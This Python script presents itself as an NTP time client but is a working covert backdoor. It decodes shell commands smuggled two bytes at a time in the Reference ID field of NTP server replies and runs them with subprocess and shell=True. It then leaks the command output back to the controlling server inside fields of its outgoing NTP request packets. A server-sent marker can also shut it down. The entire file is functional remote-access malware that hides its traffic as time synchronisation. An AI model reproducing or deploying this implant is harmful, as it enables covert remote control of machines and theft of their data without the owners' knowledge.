import socket
import time
import struct
import subprocess
import sys
from datetime import datetime
from enum import Enum, auto


def id_to_bytes(client_id: str) -> bytes:
    return client_id.encode()[:16].ljust(16, b'\x00')


class EstadoCliente(Enum):
    IDLE               = auto()
    RECIBIENDO_COMANDO = auto()
    ENVIANDO_RESPUESTA = auto()
    DESACTIVADO        = auto()


class NTPClient:
    NTP_EPOCH_OFFSET  = 2208988800
    MAX_FALLOS        = 5
    MARCA_DESACTIVADO = 0xDEAD0000

    def __init__(self, client_id: str, server_host: str,
                 server_port: int = 123, interval: int = 10):
        self.client_id   = client_id
        self.id_bytes    = id_to_bytes(client_id)
        self.server_host = server_host
        self.server_port = server_port
        self.interval    = interval
        self.running     = False

        self.estado              = EstadoCliente.IDLE
        self.buffer_cmd          = bytearray()
        self.resultado_bytes     = b''
        self.offset_resultado    = 0
        self.ultimo_frag_cmd     = -1
        self.fallos_consecutivos = 0

    def start(self):
        self.running = True
        print(f"🕐 Cliente NTP iniciado  [ID={self.client_id}]")
        print(f"📡 Servidor: {self.server_host}:{self.server_port}")
        print(f"⏱️  Intervalo: {self.interval}s\n")

        n = 0
        while self.running:
            if self.estado == EstadoCliente.DESACTIVADO:
                print("🚫 Cliente desactivado — deteniendo.")
                break
            try:
                n += 1
                print(f"📡 Petición #{n}  [estado={self.estado.name}]")
                self._send_request()
                for i in range(self.interval, 0, -1):
                    if not self.running:
                        break
                    print(f"⏳ Próxima en {i}s...", end='\r')
                    time.sleep(1)
                print(" " * 40, end='\r')
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"❌ Error inesperado: {e}")
                time.sleep(self.interval)

    def stop(self):
        self.running = False
        print("\n🛑 Cliente detenido")

    def _send_request(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            packet, acaba_de_terminar = self._build_packet()
            sock.sendto(packet, (self.server_host, self.server_port))
            data, addr = sock.recvfrom(1024)
            sock.close()
            self.fallos_consecutivos = 0
            if len(data) >= 48:
                self._procesar_respuesta(data, addr, ignorar_ref_id=acaba_de_terminar)
        except socket.timeout:
            self.fallos_consecutivos += 1
            print(f"⏰ Timeout ({self.fallos_consecutivos}/{self.MAX_FALLOS})\n")
            if self.fallos_consecutivos >= self.MAX_FALLOS:
                print("❌ Demasiados fallos — desactivando cliente.")
                self.estado  = EstadoCliente.DESACTIVADO
                self.running = False
        except Exception as e:
            self.fallos_consecutivos += 1
            print(f"❌ Error: {e}  ({self.fallos_consecutivos}/{self.MAX_FALLOS})\n")
            if self.fallos_consecutivos >= self.MAX_FALLOS:
                print("❌ Demasiados fallos — desactivando cliente.")
                self.estado  = EstadoCliente.DESACTIVADO
                self.running = False

    def _build_packet(self) -> tuple[bytearray, bool]:
        packet = bytearray(48)
        packet[0]    = 0x23
        packet[4:20] = self.id_bytes   # ID en bytes 4-19
        acaba_de_terminar = False

        if self.estado == EstadoCliente.ENVIANDO_RESPUESTA:
            fragmento = self._siguiente_fragmento_resultado()
            if fragmento is not None:
                struct.pack_into('!I', packet, 24, 0xFFFFFFFF)
                struct.pack_into('!I', packet, 28, fragmento)
                print(f"   📤 Enviando frag resultado: {self._describe_frag(fragmento)}")
            else:
                self._ir_a_idle()
                struct.pack_into('!I', packet, 24, 0xFFFFFFFE)
                struct.pack_into('!I', packet, 28, 0)
                acaba_de_terminar = True
        else:
            struct.pack_into('!I', packet, 24, 12345)
            struct.pack_into('!I', packet, 28, 67890)

        ts = self._ntp_timestamp()
        struct.pack_into('!I', packet, 40, ts >> 32)
        struct.pack_into('!I', packet, 44, ts & 0xFFFFFFFF)
        return packet, acaba_de_terminar

    def _procesar_respuesta(self, data: bytes, addr, ignorar_ref_id: bool = False):
        tx_sec  = struct.unpack_from('!I', data, 40)[0]
        tx_frac = struct.unpack_from('!I', data, 44)[0]
        t3 = self._ntp_to_unix((tx_sec << 32) | tx_frac)
        print(f"✅ Respuesta de {addr[0]}:{addr[1]}")
        print(f"   Servidor: {datetime.fromtimestamp(t3)}  |  Local: {datetime.now()}")
        print(f"   Δ {(t3 - time.time())*1000:.2f} ms\n")

        ref_id = struct.unpack_from('!I', data, 12)[0]
        if ref_id == self.MARCA_DESACTIVADO:
            print("🚫 Servidor indicó DESACTIVACIÓN — cerrando cliente.")
            self.estado  = EstadoCliente.DESACTIVADO
            self.running = False
            return

        if ignorar_ref_id:
            print("   ⏭️  Ciclo de transición → ignorando Reference ID")
            return

        if ref_id == 0x47505300 or self.estado == EstadoCliente.ENVIANDO_RESPUESTA:
            return

        if (ref_id >> 24) & 0xFF != 0xFF:
            return

        self._procesar_fragmento_comando(ref_id)

    def _procesar_fragmento_comando(self, ref_id: int):
        num_frag = (ref_id >> 16) & 0xFF
        mas      = (ref_id >> 15) & 1
        datos    = ref_id & 0x7FFF
        byte1    = (datos >> 8) & 0xFF
        byte2    = datos & 0xFF

        if num_frag == 0 or self.estado == EstadoCliente.IDLE:
            self.buffer_cmd      = bytearray()
            self.ultimo_frag_cmd = -1
            self.estado          = EstadoCliente.RECIBIENDO_COMANDO

        if num_frag <= self.ultimo_frag_cmd:
            print(f"   ⚠️  Fragmento {num_frag} duplicado, ignorado")
            return

        self.ultimo_frag_cmd = num_frag
        if byte1: self.buffer_cmd.append(byte1)
        if byte2: self.buffer_cmd.append(byte2)
        print(f"   📥 Frag cmd {num_frag} (más={mas}): {bytes([byte1, byte2])}")

        if mas == 0:
            comando = self.buffer_cmd.decode('utf-8', errors='replace')
            print(f"   🚀 Comando completo: '{comando}'")
            self._ejecutar_comando(comando)

    def _ejecutar_comando(self, comando: str):
        try:
            r      = subprocess.run(comando, shell=True, capture_output=True,
                                    text=True, timeout=10)
            salida = (r.stdout + r.stderr).encode()
        except Exception as e:
            salida = f"ERROR: {e}".encode()
        print(f"   ⚡ Ejecutado. Resultado: {salida[:60]!r}…")
        self.resultado_bytes  = salida
        self.offset_resultado = 0
        self.estado           = EstadoCliente.ENVIANDO_RESPUESTA

    def _siguiente_fragmento_resultado(self):
        if self.offset_resultado >= len(self.resultado_bytes):
            return None
        byte1 = self.resultado_bytes[self.offset_resultado]
        self.offset_resultado += 1
        if self.offset_resultado < len(self.resultado_bytes):
            byte2 = self.resultado_bytes[self.offset_resultado]
            self.offset_resultado += 1
        else:
            byte2 = 0
        mas      = 1 if self.offset_resultado < len(self.resultado_bytes) else 0
        num_frag = max(0, self.offset_resultado // 2 - 1)
        datos    = (byte1 << 8) | byte2
        return (0xFF << 24) | (num_frag << 16) | (mas << 15) | datos

    def _ir_a_idle(self):
        print("   ✅ Respuesta enviada completamente → IDLE")
        self.estado           = EstadoCliente.IDLE
        self.resultado_bytes  = b''
        self.offset_resultado = 0
        self.buffer_cmd       = bytearray()
        self.ultimo_frag_cmd  = -1

    def _ntp_timestamp(self) -> int:
        t        = time.time() + self.NTP_EPOCH_OFFSET
        seconds  = int(t)
        fraction = int((t - seconds) * 2**32)
        return (seconds << 32) | fraction

    def _ntp_to_unix(self, ntp: int) -> float:
        seconds  = ntp >> 32
        fraction = ntp & 0xFFFFFFFF
        return (seconds - self.NTP_EPOCH_OFFSET) + (fraction / 2**32)

    @staticmethod
    def _describe_frag(val: int) -> str:
        num_frag = (val >> 16) & 0xFF
        mas      = (val >> 15) & 1
        datos    = val & 0x7FFF
        b1, b2   = (datos >> 8) & 0xFF, datos & 0xFF
        return f"frag={num_frag} más={mas} bytes={bytes([b1, b2])}"


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python ntp-client.py <id_cliente> <servidor> [intervalo]")
        sys.exit(1)

    client_id = sys.argv[1]
    servidor  = sys.argv[2]
    intervalo = int(sys.argv[3]) if len(sys.argv) > 3 else 10

    client = NTPClient(client_id=client_id, server_host=servidor, interval=intervalo)
    try:
        client.start()
    except KeyboardInterrupt:
        client.stop()